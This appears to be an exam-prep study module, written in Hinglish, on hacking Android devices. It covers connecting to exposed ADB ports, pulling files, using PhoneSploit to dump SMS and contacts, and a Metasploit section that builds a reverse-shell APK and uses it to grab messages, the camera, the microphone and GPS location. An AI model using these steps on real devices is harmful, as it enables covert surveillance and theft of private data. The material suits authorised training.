# 📱 Module 8: Android Hacking

> **ADB se Android device hack karo — exam mein aksar aata hai!**

---

## 📡 Android Hacking via ADB

### Step 1: Scan for ADB Port
```bash
# ADB runs on port 5555
nmap -sV -p 5555 <target_ip>

# Full scan to confirm
nmap -A <target_ip>
```

### Step 2: Connect via ADB
```bash
# Connect to Android device
adb connect <target_ip>:5555

# Verify connection
adb devices

# If multiple devices, specify:
adb -s <target_ip>:5555 shell
```

### Step 3: Access Device Shell
```bash
# Get shell access
adb shell

# Once inside the shell:
pwd                           # Current directory
ls                            # List files
cd sdcard                     # Go to SD card
ls                            # List files
cat secret.txt                # Read secret file

# Common file locations:
cd /sdcard
cd /sdcard/Download
cd /sdcard/Downloads
cd /sdcard/Documents
cd /sdcard/DCIM
cd /data/local/tmp

# Search for files
find / -name "secret*" 2>/dev/null
find / -name "*.txt" 2>/dev/null
find /sdcard -name "*.txt"
```

### Step 4: File Operations
```bash
# Download file from device to computer
adb pull /sdcard/secret.txt /home/attacker/Desktop/

# Upload file to device
adb push local_file.txt /sdcard/

# Take screenshot
adb shell screencap /sdcard/screenshot.png
adb pull /sdcard/screenshot.png

# Record screen
adb shell screenrecord /sdcard/video.mp4
```

### Step 5: Device Information
```bash
# Device info
adb shell getprop ro.product.model
adb shell getprop ro.build.version.release
adb shell getprop ro.product.manufacturer

# List installed packages
adb shell pm list packages

# Get device IP
adb shell ip addr show
adb shell ifconfig
```

---

## 🛠️ PhoneSploit (ADB Exploitation Tool)

```bash
# Install/Run PhoneSploit
cd /home/attacker/Desktop/PhoneSploit
python3 phonesploit.py

# Menu options:
# 1. Show connected devices
# 2. Disconnect all devices
# 3. Connect a new phone
# 4. Access shell on phone
# 5. Install APK
# 6. Screen shot
# 7. Pull folders/files from phone
# 8. List all apps on phone
# 9. Run an app
# 14. Dump all SMS
# 15. Dump all contacts
```

---

## 📦 APK Analysis

### Extract and Analyze APK
```bash
# Decompile APK
apktool d app.apk

# Extract APK
unzip app.apk -d app_extracted/

# Find hardcoded secrets
grep -r "password" app_extracted/
grep -r "api_key" app_extracted/
grep -r "secret" app_extracted/
grep -r "http://" app_extracted/
```

---

## 🔐 Meterpreter Android Payload (Metasploit)

```bash
# Generate Android payload
msfvenom -p android/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -o hack.apk

# Start listener
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 4444
run

# After getting session:
sysinfo                    # System info
dump_sms                   # Dump SMS
dump_contacts              # Dump contacts
dump_calllog               # Dump call log
webcam_snap                # Take photo
record_mic                 # Record audio
geolocate                  # Get GPS location
```

---

## ✅ Android Hacking Quick Exam Workflow
```
1. nmap -sV -p 5555 <target_ip>       → Check ADB port
2. adb connect <target_ip>:5555       → Connect
3. adb shell                          → Get shell
4. cd sdcard → ls → cat secret.txt    → Find the flag/file
5. If not found: find / -name "*.txt" → Search everywhere
```

